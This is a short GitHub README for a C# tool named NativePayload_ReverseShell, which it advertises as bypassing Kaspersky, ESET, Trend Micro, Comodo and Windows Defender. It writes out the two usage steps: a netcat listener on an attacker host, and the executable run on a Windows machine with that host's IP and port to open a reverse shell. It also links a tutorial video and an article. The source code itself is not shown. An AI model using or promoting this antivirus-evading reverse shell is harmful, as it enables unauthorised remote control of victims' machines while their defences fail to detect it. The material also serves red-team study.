# NativePayload_ReverseShell
This is Simple C# Source code to Bypass almost "all" AVS, (kaspersky v19, Eset v12 v13 ,Trend-Micro v16, Comodo &amp; Windows Defender Bypassed via this method Very Simple) 

Note: it is "kind of Reverse shell", Can You Guess "Since When" : This Code Worked & Still Working... ? 

    //// Step 1 (Linux Side:192.168.56.1)   : nc -l -p 443 
 
    //// Step 2 (Windows Side:192.168.56.x) : NativePayload_ReverseShell.exe 192.168.56.1 443 
    
Video Step by Step : https://www.youtube.com/watch?v=VkFcy1Dg-pU&feature=youtu.be

Article : https://www.linkedin.com/pulse/bypassing-avs-c-managed-code-reverse-shell-damon-mohammadbagher/


<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_ReverseShell"/></a></p>
